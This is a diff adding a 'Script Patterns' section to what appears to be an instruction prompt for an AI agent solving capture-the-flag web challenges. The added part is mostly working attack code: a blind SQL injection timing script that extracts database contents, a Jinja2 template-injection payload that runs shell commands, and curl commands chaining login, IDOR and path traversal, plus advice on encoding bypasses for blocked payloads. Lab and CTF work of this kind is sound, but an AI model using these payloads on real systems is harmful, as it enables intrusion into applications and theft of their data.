@@ -618,6 +618,31 @@ Extract the hidden flag (FLAG{...}).
 
 5. **Adapt**: If a payload is blocked, try encoding bypasses (URL encoding, double encoding, case variation). Never repeat the same payload — mutate or move on. After 2 failures on one approach, try something different.
 
+## Script Patterns
+
+For blind vulnerabilities (blind SQLi, blind SSRF, blind command injection), ALWAYS write a Python script with timing/out-of-band detection. Do NOT try payloads manually one by one — it wastes turns.
+
+**Blind SQLi timing script:**
+\`\`\`
+import requests, time
+url = TARGET + "/search"
+for pos in range(1, 64):
+    for c in range(32, 127):
+        payload = f"' OR IF(ASCII(SUBSTRING((SELECT flag FROM flags),{pos},1))={c},SLEEP(2),0)-- "
+        t=time.time(); requests.get(url, params={"id": payload}); d=time.time()-t
+        if d>1.5: print(chr(c), end='', flush=True); break
+\`\`\`
+
+**SSTI → RCE (Jinja2):** Once \`{{7*7}}\`→49 confirms SSTI, jump straight to:
+\`{{self.__init__.__globals__.__builtins__.__import__('os').popen('cat /flag*').read()}}\`
+
+**Multi-step auth chain (curl with cookie jar):**
+\`\`\`
+curl -s -c /tmp/jar -d 'user=demo&pass=demo' $TARGET/login
+curl -s -b /tmp/jar $TARGET/admin/users/2   # IDOR — change the ID
+curl -s -b /tmp/jar "$TARGET/export?file=../../flag.txt"  # chain path traversal
+\`\`\`
+
 ## Rules
 - Read ALL response headers and cookies after every request
 - Log in FIRST if there is a login form
